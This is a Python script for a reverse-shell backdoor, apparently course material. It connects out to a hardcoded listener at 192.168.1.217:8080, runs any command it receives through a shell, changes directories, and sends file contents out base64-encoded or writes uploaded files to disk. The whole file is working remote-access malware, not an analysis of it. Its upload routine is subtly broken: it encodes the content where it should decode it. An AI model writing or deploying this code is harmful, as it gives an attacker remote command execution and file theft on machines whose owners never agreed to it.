import socket
import subprocess
import json
import os
import base64

class MySocket:
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.my_connection.connect((ip , port))

    def command_execution(self,command):
        return subprocess.check_output(command, shell=True)
    

    def json_send(self,data):
        json_data = json.dumps(data)
        self.my_connection.send(json_data)

# the loop is added to fix the issue when passing file that is to much data
    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data =json_data+ self.my_connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    # implementing the chande directory fuction cd
    def execute_cd_command(self,directory):
        os.chdir(directory)
        return "Cd to "+ directory

    #using the read binary for the file for the download
    def get_file_contents(self,path):
        with open(path,"rb") as my_file:
            return base64.b64encode(my_file.read())

    #implementing upload in the backdoor
    def save_file(self,path,content):
        with open(path,"wb") as my_file:
            my_file.write(base64.b64encode(content))
            return "Upload Ok"


# adding the code to terminate the application when quit is pass a command from the listener
    def start_socket(self):
        while True:
            command = self.json_receive()
            #Handling exception when enter invalid command
            try:
                if command[0]=="quit":
                    self.my_connection.close()
                    exit()
                #implementing cd command in the backdoor. verify that we have more than one command in the list
                elif command[0] =="cd" and len(command) > 1:
                    command_output = self.execute_cd_command(command[1])
                #implementing download in the code
                elif command[0] =="download":
                    command_output = self.get_file_contents(command[1])
                elif command[0] =="upload":
                    command_output = self.save_file(command[1],command[2])
                else:                
                    command_output = self.command_execution(command)
            except Exception:
                command_output = "Input_Error!"
            self.json_send(command_output)
        self.my_connection.close()

my_socket_object = MySocket("192.168.1.217",8080)
my_socket_object.start_socket()